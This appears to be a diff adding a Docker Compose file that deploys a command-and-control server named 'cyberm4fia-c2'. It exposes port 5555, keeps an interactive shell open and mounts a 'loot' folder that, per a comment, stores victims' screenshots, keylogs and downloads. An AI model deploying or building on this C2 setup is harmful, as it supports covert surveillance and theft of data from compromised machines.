@@ -1,0 +1,13 @@
+version: '3.8'
+
+services:
+  c2-server:
+    build: .
+    container_name: cyberm4fia-c2
+    ports:
+      - "5555:5555"
+    volumes:
+      - ./loot:/app/loot  # Screenshots, keylogs, downloads saved here
+    restart: unless-stopped
+    stdin_open: true      # Keep stdin open for interactive shell
+    tty: true             # Allocate pseudo-TTY for colors
